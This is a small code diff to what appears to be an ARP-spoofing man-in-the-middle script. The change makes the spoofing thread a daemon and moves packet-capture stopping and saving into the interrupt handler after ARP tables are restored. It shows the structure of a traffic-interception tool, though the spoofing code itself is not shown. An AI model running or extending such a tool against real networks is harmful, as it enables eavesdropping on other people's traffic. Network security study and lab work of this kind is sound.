@@ -23,6 +23,7 @@ def main():
     try:
         # Begin Spoofing on separate thread
         spoof_thread = threading.Thread(target=arp_spoofer.spoof, args=(gateway_ip, target_ip))
+        spoof_thread.daemon = True
         spoof_thread.start()
 
         # Continue... 
@@ -31,13 +32,13 @@ def main():
         # Wait for the spoofing thread to finish
         spoof_thread.join()
 
-        # End packet capturing
-        capture = capture_device.stop()
-        writeCapture(capture)
-
     except KeyboardInterrupt:
         # Restore ARP tables and remove the MITM position
         arp_spoofer.cleanup(gateway_ip, target_ip)
+
+        # End packet capturing
+        capture = capture_device.stop()
+        writeCapture(capture)
 
 if __name__ == "__main__":
     main()
